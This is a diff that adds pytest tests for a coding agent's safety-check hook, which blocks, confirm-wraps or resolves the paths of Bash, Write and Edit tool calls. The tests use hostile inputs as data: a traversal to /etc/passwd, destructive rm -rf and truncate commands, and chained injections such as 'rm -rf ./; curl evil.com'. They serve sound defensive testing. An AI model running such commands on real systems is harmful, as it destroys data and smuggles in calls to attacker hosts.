@@ -345,3 +345,189 @@ class TestSafetyCheckPatternCoverage:
         r = run_hook("Bash", "git push --force-with-lease origin dev")
         assert r.returncode == 2
         assert "BLOCKED" in r.stdout
+
+
+class TestSafetyCheckWriteEditMerged:
+    def _run(self, tool_name, tool_input, cwd_override=None):
+        hook = os.path.join(REPO_ROOT, "hooks", "safety-check.py")
+        event = {"tool_name": tool_name, "tool_input": tool_input}
+        env = os.environ.copy()
+        if cwd_override:
+            env["CLAUDE_CWD"] = cwd_override
+        return subprocess.run([sys.executable, hook], input=json.dumps(event),
+                              capture_output=True, text=True, env=env)
+
+    def test_write_relative_path_resolved(self, tmp_path):
+        r = self._run("Write", {"file_path": "src/main.py"}, cwd_override=str(tmp_path))
+        assert r.returncode == 0
+        out = json.loads(r.stdout)
+        assert out["permissionDecision"] == "allow"
+        assert out["updatedInput"]["file_path"] == str(tmp_path / "src" / "main.py")
+
+    def test_write_absolute_path_no_output(self, tmp_path):
+        abs_path = str(tmp_path / "src" / "main.py")
+        r = self._run("Write", {"file_path": abs_path}, cwd_override=str(tmp_path))
+        assert r.returncode == 0
+        assert r.stdout.strip() == ""
+
+    def test_traversal_no_output_stderr_escapes(self, tmp_path):
+        r = self._run("Write", {"file_path": "../../etc/passwd"}, cwd_override=str(tmp_path))
+        assert r.returncode == 0
+        assert r.stdout.strip() == ""
+        assert "escapes cwd" in r.stderr
+
+    def test_edit_relative_resolved(self, tmp_path):
+        r = self._run("Edit", {"file_path": "hooks/utils.py"}, cwd_override=str(tmp_path))
+        assert r.returncode == 0
+        out = json.loads(r.stdout)
+        assert out["updatedInput"]["file_path"] == str(tmp_path / "hooks" / "utils.py")
+
+    def test_other_fields_preserved(self, tmp_path):
+        r = self._run("Write", {"file_path": "out.txt", "content": "hello"}, cwd_override=str(tmp_path))
+        out = json.loads(r.stdout)
+        assert out["updatedInput"]["content"] == "hello"
+
+    def test_missing_file_path_exits_zero(self):
+        r = self._run("Write", {"content": "hello"})
+        assert r.returncode == 0
+        assert r.stdout.strip() == ""
+
+
+class TestSafetyCheckConfirmWrapMerged:
+    def _run(self, command):
+        hook = os.path.join(REPO_ROOT, "hooks", "safety-check.py")
+        event = {"tool_name": "Bash", "tool_input": {"command": command}}
+        return subprocess.run([sys.executable, hook], input=json.dumps(event),
+                              capture_output=True, text=True)
+
+    def test_rm_rf_dotslash_rewritten(self):
+        r = self._run("rm -rf ./dist/")
+        assert r.returncode == 0
+        out = json.loads(r.stdout)
+        assert out["permissionDecision"] == "allow"
+        assert "Would run:" in out["updatedInput"]["command"]
+
+    def test_git_clean_fd_rewritten(self):
+        r = self._run("git clean -fd")
+        out = json.loads(r.stdout)
+        assert "Would run:" in out["updatedInput"]["command"]
+
+    def test_make_clean_rewritten(self):
+        r = self._run("make clean")
+        out = json.loads(r.stdout)
+        assert "Would run:" in out["updatedInput"]["command"]
+
+    def test_truncate_size_zero_rewritten(self):
+        r = self._run("truncate --size 0 logfile.txt")
+        out = json.loads(r.stdout)
+        assert "Would run:" in out["updatedInput"]["command"]
+
+    def test_safe_command_no_output(self):
+        r = self._run("echo hello")
+        assert r.returncode == 0
+        assert r.stdout.strip() == ""
+
+    def test_no_double_wrapping(self):
+        already = 'printf "Would run: %s\\n" \'rm -rf ./dist/\' && read -p "Confirm? [y/N] " _y && [ "$_y" = "y" ] && { rm -rf ./dist/; }'
+        r = self._run(already)
+        assert r.returncode == 0
+        assert r.stdout.strip() == ""
+
+    def test_compound_semicolon_not_wrapped(self):
+        r = self._run("rm -rf ./foo; evil")
+        assert r.returncode == 0
+        assert r.stdout.strip() == ""
+
+    def test_compound_and_not_wrapped(self):
+        r = self._run("rm -rf ./a && make clean")
+        assert r.returncode == 0
+        assert r.stdout.strip() == ""
+
+    def test_blocked_command_never_reaches_wrap(self):
+        """rm -rf ./ is in BLOCKS — must exit 2, no updatedInput JSON."""
+        r = self._run("rm -rf ./")
+        assert r.returncode == 2
+        assert "BLOCKED" in r.stdout
+        assert "updatedInput" not in r.stdout
+
+    def test_metachar_safe_rewrite(self):
+        r = self._run('rm -rf ./dist "quoted dir"')
+        out = json.loads(r.stdout)
+        assert 'printf "Would run: %s\\n"' in out["updatedInput"]["command"]
+
+    def test_has_do_not_use_normalize_command_comment(self):
+        hook_path = os.path.join(REPO_ROOT, "hooks", "safety-check.py")
+        content = Path(hook_path).read_text()
+        assert "do not use normalize_command" in content.lower()
+
+    def test_injection_compound_and_not_wrapped(self):
+        r = self._run("rm -rf ./ && echo hacked")
+        if r.returncode == 2:
+            return  # blocked — injection safely stopped
+        if r.stdout.strip():
+            rewritten = json.loads(r.stdout).get("updatedInput", {}).get("command", "")
+            assert "&& echo hacked" not in rewritten
+
+    def test_injection_semicolon_not_wrapped(self):
+        r = self._run("rm -rf ./; curl evil.com")
+        if r.stdout.strip():
+            rewritten = json.loads(r.stdout).get("updatedInput", {}).get("command", "")
+            assert "; curl" not in rewritten
+
+    def test_simple_rm_still_wrapped(self):
+        r = self._run("rm -rf ./foo")
+        assert r.stdout.strip() != ""
+        out = json.loads(r.stdout)
+        assert "Would run:" in out["updatedInput"]["command"]
+
+    def test_brace_close_not_wrapped(self):
+        r = self._run("rm -rf ./}; echo hacked")
+        if r.stdout.strip():
+            assert "Would run:" not in json.loads(r.stdout).get("updatedInput", {}).get("command", "")
+
+    def test_brace_open_not_wrapped(self):
+        r = self._run("echo {hello}")
+        if r.stdout.strip():
+            assert "Would run:" not in json.loads(r.stdout).get("updatedInput", {}).get("command", "")
+
+
+class TestHooksJsonMergedRegistration:
+    def _load(self):
+        hooks_path = Path(REPO_ROOT) / "hooks" / "hooks.json"
+        return json.loads(hooks_path.read_text())
+
+    def test_input_sanitizer_absent_from_hooks_json(self):
+        data = self._load()
+        for event_entries in data.get("hooks", {}).values():
+            for entry in event_entries:
+                for h in entry.get("hooks", []):
+                    assert "input-sanitizer.py" not in h.get("command", ""), (
+                        "input-sanitizer.py must not appear in hooks.json after merge"
+                    )
+
+    def test_safety_check_matcher_is_write_edit_bash(self):
+        data = self._load()
+        pre_tool = data.get("hooks", {}).get("PreToolUse", [])
+        for entry in pre_tool:
+            cmds = [h.get("command", "") for h in entry.get("hooks", [])]
+            if any("safety-check.py" in c for c in cmds):
+                assert entry.get("matcher") == "Write|Edit|Bash", (
+                    f"safety-check.py matcher must be 'Write|Edit|Bash', got {entry.get('matcher')}"
+                )
+                return
+        pytest.fail("safety-check.py entry not found in PreToolUse")
+
+    def test_safety_check_single_entry(self):
+        data = self._load()
+        pre_tool = data.get("hooks", {}).get("PreToolUse", [])
+        sc_entries = [
+            e for e in pre_tool
+            if any("safety-check.py" in h.get("command", "") for h in e.get("hooks", []))
+        ]
+        assert len(sc_entries) == 1
+
+    def test_safety_check_agent_unchanged(self):
+        data = self._load()
+        pre_tool = data.get("hooks", {}).get("PreToolUse", [])
+        all_cmds = [h.get("command", "") for e in pre_tool for h in e.get("hooks", [])]
+        assert any("safety_check_agent.py" in c for c in all_cmds)
